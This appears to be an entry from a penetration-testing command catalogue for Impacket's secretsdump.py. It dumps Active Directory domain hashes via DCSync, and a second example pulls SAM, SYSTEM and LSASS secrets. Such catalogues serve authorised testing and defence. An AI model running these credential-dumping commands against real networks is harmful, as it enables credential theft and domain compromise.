...
name: secretsdump-py-dump-remote-hashes
type: command
executor: bash
data: 'python3 secretsdump.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP -just-dc'
output: >-
  root@kali:/usr/share/doc/python3-impacket/examples# python3 secretsdump.py
...
# secretsdump-py-dump-remote-hashes
...
Dumps domain hashes using DCSync method.
...
| @$_TARGET_IP | Target DC | Yes |
| -just-dc | Domain only | For DCSync |
...
```bash
python3 secretsdump.py domain/user:pass@target -sam -system -lsass
```
